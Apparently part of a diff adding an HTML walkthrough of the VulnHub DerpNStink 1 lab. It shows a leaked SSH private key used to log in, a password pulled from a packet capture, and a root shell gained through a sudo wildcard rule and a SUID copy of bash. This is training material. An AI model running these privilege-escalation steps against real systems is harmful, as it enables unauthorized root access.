1W&#13;&#10;pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz&#13;&#10;UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA&#13;&#10;a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o&#13;&#10;-----END RSA PRIVATE KEY-----
+    </pre>
+
+    <li>Now I copy and paste that private key to a file on my kali machine.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/DerpNStink_1/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ cat stinky_rsa                           &#13;&#10;-----BEGIN RSA PRIVATE KEY-----&#13;&#10;MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4&#13;&#10;2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO&#13;&#10;uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn&#13;&#10;AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f&#13;&#10;5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB&#13;&#10;LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc&#13;&#10;nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD&#13;&#10;D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4&#13;&#10;ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk&#13;&#10;Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq&#13;&#10;YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0&#13;&#10;DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X&#13;&#10;VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu&#13;&#10;Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7&#13;&#10;VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc&#13;&#10;fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br&#13;&#10;7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab&#13;&#10;L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q&#13;&#10;cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8&#13;&#10;gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7&#13;&#10;RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1&#13;&#10;14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W&#13;&#10;pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz&#13;&#10;UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA&#13;&#10;a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o&#13;&#10;-----END RSA PRIVATE KEY-----
+    </pre>
+
+    <li>Then I set the permissions on that private key file so that ssh will accept it.</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/VulnHub/DerpNStink_1/exfiltrated]
+└─$ chmod 600 stinky_rsa 
+    </pre>
+
+    <li>Then I login via ssh using the private key</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/DerpNStink_1/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ ssh stinky@10.0.0.21 -i stinky_rsa &#13;&#10;The authenticity of host &apos;10.0.0.21 (10.0.0.21)&apos; can&apos;t be established.&#13;&#10;ECDSA key fingerprint is SHA256:qT1plVN18XwMzkU3qgKKZJAoPJC3+eZDxlrczLy3iCY.&#13;&#10;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes&#13;&#10;Warning: Permanently added &apos;10.0.0.21&apos; (ECDSA) to the list of known hosts.&#13;&#10;Ubuntu 14.04.5 LTS&#13;&#10;&#13;&#10;&#13;&#10;                       ,~~~~~~~~~~~~~..&#13;&#10;                       &apos;  Derrrrrp  N  `&#13;&#10;        ,~~~~~~,       |    Stink      | &#13;&#10;       / ,      \      &apos;,  ________ _,&quot;&#13;&#10;      /,~|_______\.      \/&#13;&#10;     /~ (__________)   &#13;&#10;    (*)  ; (^)(^)&apos;:&#13;&#10;        =;  ____  ;&#13;&#10;          ; &quot;&quot;&quot;&quot;  ;=&#13;&#10;   {&quot;}_   &apos; &apos;&quot;&quot;&apos; &apos; _{&quot;}&#13;&#10;   \__/     &gt;  &lt;   \__/&#13;&#10;      \    ,&quot;   &quot;,  /&#13;&#10;       \  &quot;       /&quot;&#13;&#10;          &quot;      &quot;=&#13;&#10;           &gt;     &lt;&#13;&#10;          =&quot;     &quot;-&#13;&#10;          -`.   ,&apos;&#13;&#10;                -&#13;&#10;            `--&apos;&#13;&#10;&#13;&#10;Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)&#13;&#10;&#13;&#10; * Documentation:  https://help.ubuntu.com/&#13;&#10;&#13;&#10;331 packages can be updated.&#13;&#10;231 updates are security updates.&#13;&#10;&#13;&#10;Last login: Mon Nov 13 00:31:29 2017 from 192.168.1.129&#13;&#10;stinky@DeRPnStiNK:~$ 
+    </pre>
+
+    <h2><a id="mrderp">Shell - mrderp</a></h2>
+
+    <li>Inside of the folder "Documents" in stinky's home directory, we find a pcap file called derpissues.pcap.</li>
+
+    <pre>
+stinky@DeRPnStiNK:~/Documents$ ls -la&#13;&#10;total 4300&#13;&#10;drwxr-xr-x  2 stinky stinky    4096 Nov 13  2017 .&#13;&#10;drwx------ 13 stinky stinky    4096 Sep 27 14:43 ..&#13;&#10;-rw-r--r--  1 root   root   4391468 Nov 13  2017 derpissues.pcap&#13;&#10;stinky@DeRPnStiNK:~/Documents$ 
+    </pre>
+
+    <li>I transfer this file back to my Kali machine using scp</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/DerpNStink_1/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ scp -i stinky_rsa stinky@10.0.0.21:~/Documents/derpissues.pcap .                                                                 130 &Cross;&#13;&#10;Ubuntu 14.04.5 LTS&#13;&#10;&#13;&#10;&#13;&#10;                       ,~~~~~~~~~~~~~..&#13;&#10;                       &apos;  Derrrrrp  N  `&#13;&#10;        ,~~~~~~,       |    Stink      | &#13;&#10;       / ,      \      &apos;,  ________ _,&quot;&#13;&#10;      /,~|_______\.      \/&#13;&#10;     /~ (__________)   &#13;&#10;    (*)  ; (^)(^)&apos;:&#13;&#10;        =;  ____  ;&#13;&#10;          ; &quot;&quot;&quot;&quot;  ;=&#13;&#10;   {&quot;}_   &apos; &apos;&quot;&quot;&apos; &apos; _{&quot;}&#13;&#10;   \__/     &gt;  &lt;   \__/&#13;&#10;      \    ,&quot;   &quot;,  /&#13;&#10;       \  &quot;       /&quot;&#13;&#10;          &quot;      &quot;=&#13;&#10;           &gt;     &lt;&#13;&#10;          =&quot;     &quot;-&#13;&#10;          -`.   ,&apos;&#13;&#10;                -&#13;&#10;            `--&apos;&#13;&#10;&#13;&#10;derpissues.pcap                                                                                          100% 4289KB  50.3MB/s   00:00    
+    </pre>
+
+    <li>There is another useful file we can find within stinky's home directory before loading the pcap file into wireshark.  This file called derpissues.txt in ~/ftp/files/network-logs.</li>
+
+    <pre>
+stinky@DeRPnStiNK:~/ftp/files/network-logs$ ls -la&#13;&#10;total 12&#13;&#10;drwxr-xr-x 2 stinky stinky 4096 Nov 12  2017 .&#13;&#10;drwxr-xr-x 5 stinky stinky 4096 Nov 12  2017 ..&#13;&#10;-rwxr-xr-x 1 root   root    719 Nov 12  2017 derpissues.txt&#13;&#10;stinky@DeRPnStiNK:~/ftp/files/network-logs$ cat derpissues.txt &#13;&#10;12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?&#13;&#10;12:07 stinky: yeah. did you need a password reset?&#13;&#10;12:07 mrderp: I think i accidently deleted my account&#13;&#10;12:07 mrderp: i just need to logon once to make a change&#13;&#10;12:07 stinky: im gonna packet capture so we can figure out whats going on&#13;&#10;12:07 mrderp: that seems a bit overkill, but wtv&#13;&#10;12:08 stinky: commence the sniffer!!!!&#13;&#10;12:08 mrderp: -_-&#13;&#10;12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?&#13;&#10;12:11 mrderp: awesome it works!&#13;&#10;12:12 stinky: we really are the best sysadmins #team&#13;&#10;12:13 mrderp: i guess we are...&#13;&#10;12:15 mrderp: alright I made the changes, feel free to decomission my account&#13;&#10;12:20 stinky: done! yay
+    </pre>
+
+    <li>By reading through derpissues.txt we know that we should be looking for a password for mrderp in the pcap file.  Now we go back to our Kali machine and load the pcap file into wireshark.  Once it is loaded, we set the filter to "http" and then press ctrl + f to find a packet.  In the search bar for finding a packet we type "mrderp" and then click "find" until we come accross a packet that reveals mrderp's password.  The packet search criteria must also be set to "Packet details" in this case.</li>
+
+    <img src="../images/derpnstink1/mrderp_password.png">
+
+    <br>
+    <br>
+
+    <li>Using the password derpderpderpderpderpderpderp we are able to use the "su" command to switch to the user mrderp.</li>
+
+    <br>
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>As mrderp I check sudo -l to check for any sudo permissions.</li>
+
+    <pre>
+mrderp@DeRPnStiNK:~/binaries$ sudo -l&#13;&#10;Matching Defaults entries for mrderp on DeRPnStiNK:&#13;&#10;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin&#13;&#10;&#13;&#10;User mrderp may run the following commands on DeRPnStiNK:&#13;&#10;    (ALL) /home/mrderp/binaries/derpy*
+    </pre>
+
+    <li>We are able to execute /home/mrderp/binaries/derpy* as any user we want.  the binaries directory does not exist in mrderp's home directory so I create it.  Then I create a script inside that directory that will create a root owned bash file with the SUID bit set so we can gain a root shell.  I also set executable permission on the file using "chmod +x derpy1"</li>
+
+    <pre>
+mrderp@DeRPnStiNK:~/binaries$ cat derpy1 &#13;&#10;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; &#13;&#10;mrderp@DeRPnStiNK:~/binaries$ chmod +x derpy1 
+    </pre>
+
+    <li>With the script in place I execute it as root and then go to the /tmp directory to see if the file has been created.</li>
+
+    <pre>
+mrderp@DeRPnStiNK:~/binaries$ sudo -u root /home/mrderp/binaries/derpy1&#13;&#10;mrderp@DeRPnStiNK:~/binaries$ cd /tmp&#13;&#10;mrderp@DeRPnStiNK:/tmp$ ls -la&#13;&#10;total 1448&#13;&#10;drwxrwxrwt  5 root   root     4096 Sep 27 15:34 .&#13;&#10;drwxr-xr-x 23 root   root     4096 Nov 12  2017 ..&#13;&#10;drwxrwxrwt  2 root   root     4096 Sep 27 12:18 .ICE-unix&#13;&#10;-rwxr-xr-x  1 stinky stinky 470149 Sep 27 14:42 linpeas.sh&#13;&#10;-rwsr-sr-x  1 root   root   986672 Sep 27 15:34 rootbash&#13;&#10;-rw-r--r--  1 root   root        0 Sep 27 15:29 test&#13;&#10;drwx------  2 root   root     4096 Sep 27 12:18 vmware-root&#13;&#10;-r--r--r--  1 root   root       11 Sep 27 12:18 .X0-lock&#13;&#10;drwxrwxrwt  2 root   root     4096 Sep 27 12:18 .X11-unix
+    </pre>
+
+    <li>The file has been created.  I execute rootbash with the -p flag for persistent permissions and I now have a root shell</li>
+
+    <pre>
+mrderp@DeRPnStiNK:/tmp$ ./rootbash -p
+rootbash-4.3# id
+uid=1000(mrderp) gid=1000(mrderp) euid=0(root) egid=0(root) groups=0(root),1000(mrderp)
+rootbash-4.3# 
+    </pre>
+
+
+</body>
+</html>
+
